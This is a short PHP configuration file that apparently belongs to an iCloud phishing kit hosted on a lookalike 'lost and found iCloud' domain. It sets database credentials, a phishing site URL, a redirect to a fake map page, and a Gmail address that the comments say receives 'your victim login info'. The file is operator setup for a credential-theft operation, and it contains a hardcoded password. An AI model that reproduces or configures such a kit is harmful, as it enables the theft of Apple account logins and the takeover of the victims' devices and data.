<?php 
define("HOST","localhost"); 

define("USER","lostandf_root"); 	// 	Your database user

define("PASS","facebook123"); 		//	your database password

define("DB","lostandf_icloud");	// 	Your database name// must be enter email address with same domain where you install this script. like: example@domain.com// this email send your victim login info. Required. 

define("TO_EMAIL", "icloudiap@gmail.com");	

define("FROM_EMAIL", "noreply@lostandfound-icloud.com");  // eg. noreply@domain.com  

define("PATH", "http://www.lostandfound-icloud.com");  				//http://domain.com

define("REDIRECT", "/map/"); 		// Don't Change this. 

define("GOOGLE_ANALYTIC", "");		// Google analytic code here: eg. UA-63329111-1

?>